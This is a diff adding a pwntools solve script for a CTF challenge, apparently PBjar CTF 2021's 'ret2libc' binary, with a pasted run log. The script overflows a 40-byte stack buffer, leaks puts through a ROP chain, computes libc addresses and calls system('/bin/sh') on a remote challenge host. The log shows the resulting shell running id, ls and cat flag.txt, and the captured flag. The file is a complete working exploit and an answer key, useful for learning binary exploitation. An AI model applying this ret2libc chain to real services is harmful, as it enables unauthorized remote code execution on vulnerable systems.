@@ -1,0 +1,109 @@
+from pwn import *
+
+#context(os='linux', arch='amd64')
+#context.log_level = 'debug'
+
+BINARY = './ret2libc'
+elf  = ELF(BINARY)
+
+if len(sys.argv) > 1 and sys.argv[1] == 'r':
+  HOST = "143.198.127.103"
+  PORT = 42001
+  s = remote(HOST, PORT)
+  libc = ELF("./libc-2.31.so")
+else:
+  s = process(BINARY)
+  #s = process(BINARY, env={'LD_PRELOAD': './libc-2.31.so'})
+  libc = elf.libc
+  #libc = ELF("./libc-2.31.so")
+
+pop_rdi_ret = 0x40155b # pop rdi; ret;
+
+s.recvuntil("ret2libc?[y/N]")
+
+buf  = b"A"*40
+buf += p64(pop_rdi_ret)
+buf += p64(elf.got.puts)
+buf += p64(elf.plt.puts)
+buf += p64(elf.sym.main)
+s.sendline(buf)
+
+s.recvuntil("natural!\n\n")
+r = s.recvuntil("\n")[:-1]
+puts_addr   = u64(r + b"\x00\x00")
+libc_base   = puts_addr - libc.sym.puts
+system_addr = libc_base + libc.sym.system
+binsh_addr  = libc_base + next(libc.search(b'/bin/sh'))
+
+print("puts_addr   =", hex(puts_addr))
+print("libc_base   =", hex(libc_base))
+print("system_addr =", hex(system_addr))
+print("binsh_addr  =", hex(binsh_addr))
+
+s.recvuntil("ret2libc?[y/N]")
+
+buf  = b"A"*40
+buf += p64(pop_rdi_ret+1)
+buf += p64(pop_rdi_ret)
+buf += p64(binsh_addr)
+buf += p64(system_addr)
+
+s.sendline(buf)
+
+s.interactive()
+
+'''
+mito@ubuntu:~/CTF/PBjar_CTF_2021/Pwn_Ret2Libc/ret2libc$ python3 solve.py r
+[*] '/home/mito/CTF/PBjar_CTF_2021/Pwn_Ret2Libc/ret2libc/ret2libc'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+[+] Opening connection to 143.198.127.103 on port 42001: Done
+[*] '/home/mito/CTF/PBjar_CTF_2021/Pwn_Ret2Libc/ret2libc/libc-2.31.so'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+puts_addr   = 0x7f02964285f0
+libc_base   = 0x7f02963b2000
+system_addr = 0x7f02963fae50
+binsh_addr  = 0x7f029653c152
+[*] Switching to interactive mode
+
+
+I see, you must be a natural!
+
+$ id
+uid=1000(user) gid=1000(user) groups=1000(user)
+$ ls -l
+total 2028
+lrwxrwxrwx   1 root root       7 Aug 27 07:16 bin -> usr/bin
+drwxr-xr-x   2 root root    4096 Apr 15  2020 boot
+drwxr-xr-x   5 root root     340 Sep 17 04:38 dev
+drwxr-xr-x   1 root root    4096 Sep 17 04:38 etc
+-rwxr-xr-x   1 root root      43 Sep 17 04:27 flag.txt
+drwxr-xr-x   1 root root    4096 Sep 17 04:38 home
+-rwxr-xr-x   1 root root  177928 Sep 17 04:27 ld-2.31.so
+lrwxrwxrwx   1 root root       7 Aug 27 07:16 lib -> usr/lib
+lrwxrwxrwx   1 root root       9 Aug 27 07:16 lib32 -> usr/lib32
+lrwxrwxrwx   1 root root       9 Aug 27 07:16 lib64 -> usr/lib64
+-rwxr-xr-x   1 root root 1839792 Sep 17 04:27 libc-2.31.so
+lrwxrwxrwx   1 root root      10 Aug 27 07:16 libx32 -> usr/libx32
+drwxr-xr-x   2 root root    4096 Aug 27 07:16 media
+drwxr-xr-x   2 root root    4096 Aug 27 07:16 mnt
+drwxr-xr-x   2 root root    4096 Aug 27 07:16 opt
+dr-xr-xr-x 261 root root       0 Sep 17 04:38 proc
+drwx------   2 root root    4096 Aug 27 07:27 root
+drwxr-xr-x   5 root root    4096 Aug 27 07:27 run
+lrwxrwxrwx   1 root root       8 Aug 27 07:16 sbin -> usr/sbin
+drwxr-xr-x   2 root root    4096 Aug 27 07:16 srv
+dr-xr-xr-x  13 root root       0 Sep 17 04:38 sys
+drwxrwxrwt   1 root root    4096 Sep 17 04:38 tmp
+drwxr-xr-x   1 root root    4096 Aug 27 07:16 usr
+drwxr-xr-x   1 root root    4096 Aug 27 07:27 var
+$ cat flag.txt
+flag{th3_wh0l3_us3l3r4nd_1s_my_pl4ygr0und}
+'''
